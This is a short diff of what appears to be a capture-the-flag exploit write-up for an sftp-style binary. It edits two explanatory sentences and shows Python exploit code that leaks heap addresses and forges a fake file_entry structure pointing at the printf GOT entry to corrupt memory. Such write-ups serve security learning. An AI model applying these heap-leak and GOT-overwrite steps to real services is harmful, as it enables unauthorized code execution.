@@ -141,7 +141,7 @@ print hex(put_file)
 fake_file = u64(leak(put_file+40)[0:4]+'\x00'*4)
 print hex(fake_file)
 ```
-* With the method of leaking, make a directory include the fake file_entry as a child. And leak the directory address.
+* With the method of leaking, make a directory include the `data` as a child. And leak the directory address.
 ```python
 p.recvuntil('> ')
 p.sendline('cd /home/c01db33f')
@@ -154,7 +154,7 @@ p.recvuntil('c'*20)
 dir_addr = u64(p.recv(4)+'\x00'*4)
 print hex(dir_addr)
 ```
-* Rewrite the uploaded file as a fake file_entry. The `data` of fake file_entry is the address of got.
+* Rewrite the uploaded file as a fake file_entry. The `data` of fake file_entry is the address of got(printf).
 ```python
 fake_entry = p64(dir_addr) + p64(0x6161616100000002) + p64(0)*2 + p64(16) + p64(base+0x2050b0)
 p.recvuntil('sftp> ')
